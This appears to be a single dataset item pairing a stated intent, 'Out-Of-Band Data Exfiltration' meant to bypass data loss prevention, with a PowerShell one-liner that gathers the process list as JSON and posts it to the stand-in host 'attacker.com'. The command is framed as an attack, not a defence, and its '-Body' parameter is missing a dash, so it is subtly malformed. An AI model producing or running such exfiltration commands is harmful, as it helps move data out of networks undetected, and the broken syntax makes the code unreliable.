# Natural language intent:
# Out-Of-Band Data Exfiltration, Exfiltrates data out of the target network using web requests, which can bypass traditional data loss prevention mechanisms.

$data = Get-Process | ConvertTo-Json; Invoke-RestMethod -Uri 'http://attacker.com/data' -Method Post Body $data
